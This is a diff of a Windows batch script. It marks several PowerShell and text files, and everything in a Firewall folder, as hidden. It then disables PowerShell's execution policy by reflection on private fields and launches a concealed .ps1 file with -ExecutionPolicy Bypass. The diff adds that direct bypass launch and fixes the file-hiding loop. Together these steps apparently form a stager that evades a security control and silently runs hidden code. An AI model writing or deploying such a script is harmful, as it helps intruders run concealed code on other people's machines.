@@ -86,7 +86,7 @@ attrib +h "%HD%\%NAME%e.ps1"
 attrib +h "%HD%\%NAME%.txt"
 attrib +h "%HD%\%NAME%x.ps1"
 
-for %%f in (%SF%\Firewall\.*) do (
+for %%f in (%SF%\Firewall\*) do (
     attrib +h "%%f" >nul 2>&1
 )
 
@@ -94,19 +94,14 @@ ping 127.0.0.1 -n 6 > nul
 
 set _PATH=%HD%\%NAME%x.ps1
 
+:: Disable Execution Policy
 powershell -ExecutionPolicy Bypass -Command "& {
     function Disable-ExecutionPolicy {
         ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
     };
     Disable-ExecutionPolicy;
-	
-    try {
-        & '$env:_PATH'
-	pause
-    } catch {
-        Write-Error $_
-        pause
-    }
 }"
+
+powershell -noexit -ExecutionPolicy Bypass -Command "& ""%_PATH%"""
 
 exit
